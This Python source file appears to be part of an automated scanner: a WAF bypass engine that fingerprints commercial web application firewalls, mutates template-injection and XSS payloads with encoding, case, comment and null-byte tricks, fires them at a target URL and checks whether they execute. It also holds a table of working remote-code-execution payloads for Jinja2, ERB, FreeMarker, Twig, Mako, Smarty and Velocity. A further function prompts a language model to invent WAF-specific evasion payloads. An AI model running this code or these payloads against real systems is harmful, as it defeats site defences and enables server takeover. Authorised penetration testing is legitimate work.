"""
WAF Bypass Engine — Attempts encoding, mutation, and evasion techniques.

When a WAF blocks a payload, this engine triggers a chain of bypass attempts
before giving up. Each technique is tried sequentially until one succeeds
or all are exhausted.

Techniques:
- URL encoding (double, triple)
- HTML entity encoding
- Unicode/UTF-8 encoding
- Case mutation
- Null byte injection
- Comment injection (JS, HTML, template)
- Whitespace manipulation
- Chunked transfer encoding
- HTTP parameter pollution
- Template syntax variants
"""

import asyncio
import re
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class BypassVerdict(Enum):
    """Verdict for a bypass attempt."""
    CONFIRMED = "confirmed"              # Bypass succeeded AND evaluation confirmed
    WAF_BLOCKED_ALL_FAILED = "waf_blocked"  # All bypass attempts blocked
    UNBLOCKED_NO_EVAL = "unblocked_no_eval"  # Got 200 but no evaluation proof
    REFLECTED_NO_EVAL = "reflected_no_eval"  # Payload echoed but not evaluated


@dataclass
class BypassResult:
    """Result of a bypass attempt."""
    technique: str
    payload_mutated: str
    status: int
    body: str
    success: bool
    evaluation_proof: Optional[str] = None  # The evaluated result (e.g., "49")
    test_url: Optional[str] = None  # The URL that was tested


@dataclass
class SSTIVerdict:
    """Final verdict for SSTI detection."""
    verdict: BypassVerdict
    confirmed: bool
    technique_used: Optional[str] = None
    payload: Optional[str] = None
    mutated_payload: Optional[str] = None
    evaluation_proof: Optional[str] = None
    status_code: int = 0
    evidence: str = ""
    all_attempts: List[BypassResult] = None

    def __post_init__(self):
        if self.all_attempts is None:
            self.all_attempts = []

    def is_reportable(self) -> bool:
        """Only CONFIRMED verdicts should reach the report."""
        return self.verdict == BypassVerdict.CONFIRMED


# ─── Template Syntax Variants ──────────────────────────────────────

# Each template engine has different syntax for expressions
TEMPLATE_SYNTAXES = {
    "jinja2": {
        "expr": "{{{expr}}}",
        "tests": [
            ("{{7*7}}", "49"),           # Basic arithmetic
            ("{{7*'7'}}", "7777777"),    # Jinja2 string multiplication (engine fingerprint)
            ("{{7**7}}", "823543"),       # Exponentiation
        ],
        "rce": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    },
    "erb": {
        "expr": "<%= {expr} %>",
        "tests": [
            ("<%= 7*7 %>", "49"),
            ("<%= 7**7 %>", "823543"),
        ],
        "rce": "<%= system('id') %>",
    },
    "freemarker": {
        "expr": "${{expr}}",
        "tests": [
            ("${7*7}", "49"),
            ("${7?c}", "7"),
        ],
        "rce": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    },
    "twig": {
        "expr": "{{{expr}}}",
        "tests": [
            ("{{7*7}}", "49"),
            ("{{7**7}}", "823543"),
        ],
        "rce": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
    },
    "mako": {
        "expr": "${{expr}}",
        "tests": [
            ("${7*7}", "49"),
        ],
        "rce": "<%! import os %> ${os.popen('id').read()}",
    },
    "smarty": {
        "expr": "{{{expr}}}",
        "tests": [
            ("{7*7}", "49"),
        ],
        "rce": "{system('id')}",
    },
    "velocity": {
        "expr": "#set($x={expr})$x",
        "tests": [
            ("#set($x=7*7)$x", "49"),
        ],
        "rce": "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($str=$x.class.forName(\"java.lang.String\"))($rt.getRuntime().exec(\"id\"))",
    },
}


def is_reportable(finding: dict) -> bool:
    """
    Determine if a finding should be included in the report.

    Only CONFIRMED verdicts (with evaluation proof) reach the report.
    WAF_BLOCKED, UNBLOCKED_NO_EVAL, and CVSS:0 findings are filtered out.
    """
    verdict = finding.get("verdict", "")

    # Only confirmed is reportable
    if verdict == "confirmed":
        # Extra safety: also check CVSS isn't 0
        cvss = finding.get("cvss_score", 0)
        if cvss == 0:
            return False
        return True

    # For non-SSTI findings without verdict field: use legacy heuristics
    if not verdict:
        sev = finding.get("severity", "").upper()
        cvss = finding.get("cvss_score", 0)
        confidence = finding.get("confidence", 0)
        # Legacy: only include if severity is LOW or higher AND has non-zero CVSS
        if sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW") and cvss > 0 and confidence > 0.5:
            return True
        return False

    # All other verdicts are not reportable
    return False


# ─── WAF Bypass Techniques ──────────────────────────────────────────

class WAFBypassEngine:
    """
    Attempts WAF bypass techniques when initial payload is blocked.

    Flow:
    1. Initial payload → 403? → Trigger bypass chain
    2. Try each technique sequentially
    3. For each technique: make request → check response
    4. If 200: check for evaluation proof
    5. Return verdict based on results
    """

    def __init__(self, request_fn):
        """
        Args:
            request_fn: Async function that takes (url, method, headers) and returns
                       {"status": int, "headers": dict, "body": str}
        """
        self.request_fn = request_fn
        self._waf_signatures = {
            "cloudflare": ["cf-ray", "cf-cache-status", "server: cloudflare"],
            "akamai": ["x-akamai-transformed", "server: akamaighost"],
            "incapsula": ["x-iinfo", "incap-ses"],
            "sucuri": ["x-sucuri-id", "server: sucuri"],
            "barracuda": ["barra_counter_session"],
            "modsecurity": ["server: mod_security", "server: modsecurity"],
        }

    def detect_waf(self, headers: dict, status: int) -> Optional[str]:
        """Detect WAF from response headers. Returns WAF name or None."""
        if status not in (403, 406, 429, 503):
            return None

        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        server = headers_lower.get("server", "")

        for waf_name, signatures in self._waf_signatures.items():
            for sig in signatures:
                if ":" in sig:
                    key, val = sig.split(":", 1)
                    if headers_lower.get(key.strip()) == val.strip():
                        return waf_name
                elif sig in server:
                    return waf_name

        return "unknown-waf" if status == 403 else None

    # ─── Bypass Techniques ─────────────────────────────────────────

    def _url_encode(self, payload: str) -> str:
        """URL encode the payload."""
        from urllib.parse import quote
        return quote(payload, safe='')

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        from urllib.parse import quote
        return quote(quote(payload, safe=''), safe='')

    def _html_encode(self, payload: str) -> str:
        """HTML entity encode special characters."""
        encoded = ""
        for char in payload:
            if char in ("<", ">", "&", "'", '"'):
                encoded += f"&#{ord(char)};"
            else:
                encoded += char
        return encoded

    def _unicode_encode(self, payload: str) -> str:
        """Unicode escape encoding."""
        result = ""
        for char in payload:
            if char in ("{", "}", "*", "<", ">", "%", "="):
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    def _case_mutate(self, payload: str) -> str:
        """Random case mutation on keywords."""
        import random
        result = ""
        for char in payload:
            if random.random() > 0.5:
                result += char.upper()
            else:
                result += char.lower()
        return result

    def _null_byte_inject(self, payload: str) -> str:
        """Insert null bytes at various positions."""
        # Insert null byte after first char
        if len(payload) > 1:
            return payload[0] + "%00" + payload[1:]
        return payload

    def _comment_inject_js(self, payload: str) -> str:
        """Inject JavaScript comments."""
        # Try: {{/**/7*7/**/}}
        return payload.replace("{{", "{/**/").replace("}}", "/**/}")

    def _comment_inject_html(self, payload: str) -> str:
        """Inject HTML comments."""
        return payload.replace("{{", "{<!-- -->").replace("}}", "<!-- -->}")

    def _whitespace_manipulate(self, payload: str) -> str:
        """Replace spaces with various whitespace."""
        import random
        whitespace_chars = ["%09", "%0a", "%0d", "%20", "/**/"]
        result = payload
        for _ in range(3):
            ws = random.choice(whitespace_chars)
            result = result.replace(" ", ws, 1)
        return result

    def _chunked_encoding(self, payload: str) -> Dict:
        """Return headers for chunked transfer encoding."""
        return {"Transfer-Encoding": "chunked"}

    def _http_parameter_pollution(self, payload: str) -> str:
        """Duplicate the parameter with benign value."""
        # If URL is http://target.com/page?test=PAYLOAD
        # Change to http://target.com/page?test=benign&test=PAYLOAD
        return payload  # Handled at URL level

    def _template_syntax_variant(self, payload: str, engine: str) -> Optional[str]:
        """Convert payload to different template engine syntax."""
        syntax = TEMPLATE_SYNTAXES.get(engine)
        if not syntax:
            return None

        # Extract the expression from the original payload
        # e.g., {{7*7}} -> 7*7
        expr_match = re.search(r'[${<%=}\s]*([\d\*\+\-/\s\'\"]+)[${<%>/}\s]*', payload)
        if not expr_match:
            return None

        expr = expr_match.group(1).strip()
        return syntax["expr"].replace("{expr}", expr)

    # ─── XSS-Specific WAF Bypass Techniques ───────────────────────

    def _xss_slash_tag(self, payload: str) -> str:
        """Insert slashes in tag names to bypass WAF: <img> → <img/>"""
        import re
        # Add slash after tag name: <img → <img/
        result = re.sub(r'<(\w+)', r'<\1/', payload)
        # Also try: <img src → <img/src
        result = re.sub(r'(\w+)\s+', r'\1/', result, count=1)
        return result

    def _xss_case_mix(self, payload: str) -> str:
        """Mix case in event handlers and tags: onerror → OnErRoR, img → ImG"""
        import re
        result = payload
        # Mix case in on* event handlers
        event_handlers = re.findall(r'\bon\w+', result, re.IGNORECASE)
        for handler in event_handlers:
            mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(handler))
            result = result.replace(handler, mixed)
        # Mix case in tag names
        tags = re.findall(r'<(\w+)', result)
        for tag in tags:
            mixed_tag = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(tag))
            result = result.replace(f"<{tag}", f"<{mixed_tag}", 1)
        return result

    # ─── Bypass Chain ──────────────────────────────────────────────

    async def attempt_bypass(
        self,
        url: str,
        param: str,
        original_payload: str,
        method: str = "GET",
        headers: dict = None,
    ) -> SSTIVerdict:
        """
        Attempt WAF bypass with multiple techniques.

        Returns SSTIVerdict with the final verdict.
        """
        all_attempts = []

        # Get the base URL and build test URL
        from urllib.parse import urlparse, parse_qs, urlencode
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Generate all mutated payloads
        mutations = self._generate_mutations(original_payload)

        # Also try template syntax variants
        for engine_name, engine_syntax in TEMPLATE_SYNTAXES.items():
            for test_payload, expected in engine_syntax["tests"]:
                mutations.append((f"syntax-{engine_name}", test_payload, expected))

        # Try each mutation
        for technique, mutated_payload, expected_result in mutations:
            # Build URL with mutated payload
            params = parse_qs(parsed.query)
            if param and param in params:
                params[param] = [mutated_payload]
            else:
                # Inject into first param or add as test
                if params:
                    first_param = list(params.keys())[0]
                    params[first_param] = [mutated_payload]
                else:
                    params["test"] = [mutated_payload]

            test_url = f"{base_url}?{urlencode(params, doseq=True)}"

            try:
                resp = await self.request_fn(test_url, method=method, headers=headers or {})
                status = resp.get("status", 0)
                body = resp.get("body", "")
                resp_headers = resp.get("headers", {})

                # Check if still blocked
                waf = self.detect_waf(resp_headers, status)
                if waf:
                    all_attempts.append(BypassResult(
                        technique=technique,
                        payload_mutated=mutated_payload,
                        status=status,
                        body=body[:500],
                        success=False,
                    ))
                    continue

                # Check for evaluation proof
                evaluation_proof = self._check_evaluation(body, expected_result)

                if evaluation_proof:
                    # CONFIRMED: Bypass succeeded AND evaluation confirmed
                    all_attempts.append(BypassResult(
                        technique=technique,
                        payload_mutated=mutated_payload,
                        status=status,
                        body=body[:500],
                        success=True,
                        evaluation_proof=evaluation_proof,
                        test_url=test_url,
                    ))
                    return SSTIVerdict(
                        verdict=BypassVerdict.CONFIRMED,
                        confirmed=True,
                        technique_used=technique,
                        payload=original_payload,
                        mutated_payload=mutated_payload,
                        evaluation_proof=evaluation_proof,
                        status_code=status,
                        evidence=f"Technique: {technique}, Status: {status}, Proof: {evaluation_proof}",
                        all_attempts=all_attempts,
                    )

                # Got 200 but no evaluation proof
                if status == 200:
                    all_attempts.append(BypassResult(
                        technique=technique,
                        payload_mutated=mutated_payload,
                        status=status,
                        body=body[:500],
                        success=False,
                        test_url=test_url,
                    ))
                else:
                    all_attempts.append(BypassResult(
                        technique=technique,
                        payload_mutated=mutated_payload,
                        status=status,
                        body=body[:500],
                        success=False,
                        test_url=test_url,
                    ))

            except Exception as e:
                all_attempts.append(BypassResult(
                    technique=technique,
                    payload_mutated=mutated_payload,
                    status=0,
                    body=f"Error: {str(e)}",
                    success=False,
                    test_url=test_url,
                ))

        # All bypasses failed
        # Determine if it was all WAF blocked or got through but no eval
        statuses = [a.status for a in all_attempts]
        if all(s in (403, 406, 429, 503) for s in statuses if s > 0):
            return SSTIVerdict(
                verdict=BypassVerdict.WAF_BLOCKED_ALL_FAILED,
                confirmed=False,
                payload=original_payload,
                evidence=f"All {len(all_attempts)} bypass attempts blocked by WAF",
                all_attempts=all_attempts,
            )
        elif any(s == 200 for s in statuses):
            return SSTIVerdict(
                verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                confirmed=False,
                payload=original_payload,
                evidence=f"Got 200 responses but no evaluation proof found",
                all_attempts=all_attempts,
            )
        else:
            return SSTIVerdict(
                verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                confirmed=False,
                payload=original_payload,
                evidence=f"Unexpected responses: {statuses}",
                all_attempts=all_attempts,
            )

    def _generate_mutations(self, payload: str) -> List[Tuple[str, str, str]]:
        """Generate mutated payloads with their expected results."""
        mutations = []

        # Extract the expression and expected result
        expected = self._extract_expected(payload)
        if not expected:
            return mutations

        # URL encoding
        mutations.append(("url-encode", self._url_encode(payload), expected))

        # Double URL encoding
        mutations.append(("double-url-encode", self._double_url_encode(payload), expected))

        # HTML encoding
        mutations.append(("html-encode", self._html_encode(payload), expected))

        # Unicode encoding
        mutations.append(("unicode-encode", self._unicode_encode(payload), expected))

        # Case mutation (try a few times)
        for i in range(3):
            mutations.append((f"case-mutate-{i}", self._case_mutate(payload), expected))

        # Null byte injection
        mutations.append(("null-byte", self._null_byte_inject(payload), expected))

        # Comment injection
        mutations.append(("comment-js", self._comment_inject_js(payload), expected))
        mutations.append(("comment-html", self._comment_inject_html(payload), expected))

        # Whitespace manipulation
        mutations.append(("whitespace", self._whitespace_manipulate(payload), expected))

        # XSS-specific WAF bypass techniques
        if "<" in payload or ">" in payload or "alert" in payload:
            mutations.append(("xss-slash-tag", self._xss_slash_tag(payload), expected))
            mutations.append(("xss-case-mix", self._xss_case_mix(payload), expected))

        return mutations

    def _extract_expected(self, payload: str) -> Optional[str]:
        """Extract the expected evaluation result from the payload."""
        # Check each template syntax
        for engine_name, engine_syntax in TEMPLATE_SYNTAXES.items():
            for test_payload, expected in engine_syntax["tests"]:
                if payload == test_payload or self._normalize(payload) == self._normalize(test_payload):
                    return expected
        return None

    def _normalize(self, s: str) -> str:
        """Normalize a string for comparison."""
        return re.sub(r'\s+', '', s).lower()

    def _check_evaluation(self, body: str, expected: str) -> Optional[str]:
        """
        Check if the expected evaluation result appears in the body.

        Returns the proof string with context if found, None otherwise.
        """
        if not body or not expected:
            return None

        # The expected result must appear in the body
        if expected not in body:
            return None

        # CRITICAL: Reject if the raw payload is just echoed back
        # (reflected input ≠ template execution)
        raw_payload_indicators = [
            "{{" + expected + "}}",
            "${" + expected + "}",
            "<%= " + expected + " %>",
            f"<{expected}>",
        ]
        for indicator in raw_payload_indicators:
            if indicator in body:
                # The payload was echoed, not evaluated
                return None

        return expected

    # ─── LLM-Based WAF Bypass Learning ──────────────────────────────

    async def llm_generate_bypass_payloads(
        self,
        waf_name: str,
        original_payload: str,
        blocked_status: int,
        response_body: str = "",
    ) -> List[Tuple[str, str, str]]:
        """
        Use LLM to generate WAF-specific bypass payloads.

        When standard techniques fail, ask the LLM to generate
        bypass payloads specific to the detected WAF.

        Returns list of (technique, payload, expected) tuples.
        """
        try:
            from models import model_client
            model = model_client
        except ImportError:
            return []

        prompt = f"""You are a security researcher specializing in WAF bypass techniques.

TASK: Generate 5 SSTI (Server-Side Template Injection) bypass payloads for a {waf_name} WAF.

CONTEXT:
- Original payload: {original_payload}
- Blocked with status: {blocked_status}
- Response body snippet: {response_body[:200] if response_body else "N/A"}

REQUIREMENTS:
1. Each payload must be a DIFFERENT bypass technique
2. Focus on techniques specific to {waf_name} WAF
3. Include encoding, case mutation, comment injection, and template syntax variants
4. Each payload must evaluate to a arithmetic expression (like 7*7=49) for verification
5. Return ONLY a JSON array with format: [{{"technique": "name", "payload": "payload", "expected": "result"}}]

COMMON {waf_name.upper()} BYPASS TECHNIQUES:
{"- Cloudflare: Use chunked encoding, Unicode escape, comment injection, double encoding" if waf_name == "cloudflare" else ""}
{"- Akamai: Use path traversal, case mutation, null byte injection" if waf_name == "akamai" else ""}
{"- Sucuri: Use HTTP parameter pollution, raw URL encoding" if waf_name == "sucuri" else ""}
{"- ModSecurity: Use encoding tricks, comment injection, whitespace manipulation" if waf_name == "modsecurity" else ""}

OUTPUT FORMAT (JSON only):
[
  {{"technique": "technique-name", "payload": "bypass-payload", "expected": "49"}},
  ...
]

Return ONLY the JSON array, no other text."""

        try:
            response = await model.generate(prompt, model="glm")
            # Parse JSON response
            import json
            # Extract JSON from response (might be wrapped in markdown)
            json_match = re.search(r'\[.*\]', response, re.DOTALL)
            if json_match:
                payloads = json.loads(json_match.group())
                return [(p["technique"], p["payload"], p["expected"]) for p in payloads[:5]]
        except Exception as e:
            print(f"LLM bypass generation failed: {e}")

        return []

    async def attempt_bypass_with_llm(
        self,
        url: str,
        param: str,
        original_payload: str,
        method: str = "GET",
        headers: dict = None,
    ) -> SSTIVerdict:
        """
        Enhanced bypass attempt with LLM-based payload generation.

        Flow:
        1. Try standard bypass techniques
        2. If all blocked → use LLM to generate WAF-specific payloads
        3. Try LLM-generated payloads
        4. Return verdict
        """
        all_attempts = []

        # Get the base URL and build test URL
        from urllib.parse import urlparse, parse_qs, urlencode
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Step 1: Try standard bypass techniques first
        standard_result = await self.attempt_bypass(url, param, original_payload, method, headers)
        all_attempts.extend(standard_result.all_attempts)

        # If confirmed, return immediately
        if standard_result.verdict == BypassVerdict.CONFIRMED:
            return standard_result

        # Step 2: If all blocked, use LLM to generate WAF-specific payloads
        if standard_result.verdict == BypassVerdict.WAF_BLOCKED_ALL_FAILED:
            # Detect WAF from the blocked responses
            waf_name = "unknown"
            for attempt in all_attempts:
                if attempt.status in (403, 406, 429, 503):
                    waf = self.detect_waf({}, attempt.status)
                    if waf:
                        waf_name = waf
                        break

            # Get blocked response body for context
            blocked_body = ""
            for attempt in all_attempts:
                if attempt.status in (403, 406, 429, 503):
                    blocked_body = attempt.body
                    break

            # Generate LLM-based bypass payloads
            llm_payloads = await self.llm_generate_bypass_payloads(
                waf_name, original_payload, 403, blocked_body
            )

            # Try each LLM-generated payload
            for technique, mutated_payload, expected_result in llm_payloads:
                params = parse_qs(parsed.query)
                if param and param in params:
                    params[param] = [mutated_payload]
                else:
                    if params:
                        first_param = list(params.keys())[0]
                        params[first_param] = [mutated_payload]
                    else:
                        params["test"] = [mutated_payload]

                test_url = f"{base_url}?{urlencode(params, doseq=True)}"

                try:
                    resp = await self.request_fn(test_url, method=method, headers=headers or {})
                    status = resp.get("status", 0)
                    body = resp.get("body", "")
                    resp_headers = resp.get("headers", {})

                    # Check if still blocked
                    waf = self.detect_waf(resp_headers, status)
                    if waf:
                        all_attempts.append(BypassResult(
                            technique=f"llm-{technique}",
                            payload_mutated=mutated_payload,
                            status=status,
                            body=body[:500],
                            success=False,
                            test_url=test_url,
                        ))
                        continue

                    # Check for evaluation proof
                    evaluation_proof = self._check_evaluation(body, expected_result)

                    if evaluation_proof:
                        all_attempts.append(BypassResult(
                            technique=f"llm-{technique}",
                            payload_mutated=mutated_payload,
                            status=status,
                            body=body[:500],
                            success=True,
                            evaluation_proof=evaluation_proof,
                            test_url=test_url,
                        ))
                        return SSTIVerdict(
                            verdict=BypassVerdict.CONFIRMED,
                            confirmed=True,
                            technique_used=f"llm-{technique}",
                            payload=original_payload,
                            mutated_payload=mutated_payload,
                            evaluation_proof=evaluation_proof,
                            status_code=status,
                            evidence=f"LLM technique: {technique}, Status: {status}, Proof: {evaluation_proof}",
                            all_attempts=all_attempts,
                        )

                    all_attempts.append(BypassResult(
                        technique=f"llm-{technique}",
                        payload_mutated=mutated_payload,
                        status=status,
                        body=body[:500],
                        success=False,
                        test_url=test_url,
                    ))

                except Exception as e:
                    all_attempts.append(BypassResult(
                        technique=f"llm-{technique}",
                        payload_mutated=mutated_payload,
                        status=0,
                        body=f"Error: {str(e)}",
                        success=False,
                        test_url=test_url,
                    ))

        # Final verdict based on all attempts (standard + LLM)
        statuses = [a.status for a in all_attempts]
        if all(s in (403, 406, 429, 503) for s in statuses if s > 0):
            return SSTIVerdict(
                verdict=BypassVerdict.WAF_BLOCKED_ALL_FAILED,
                confirmed=False,
                payload=original_payload,
                evidence=f"All {len(all_attempts)} bypass attempts blocked by WAF (including LLM payloads)",
                all_attempts=all_attempts,
            )
        elif any(s == 200 for s in statuses):
            return SSTIVerdict(
                verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                confirmed=False,
                payload=original_payload,
                evidence=f"Got 200 responses but no evaluation proof found",
                all_attempts=all_attempts,
            )
        else:
            return SSTIVerdict(
                verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                confirmed=False,
                payload=original_payload,
                evidence=f"Unexpected responses: {statuses}",
                all_attempts=all_attempts,
            )
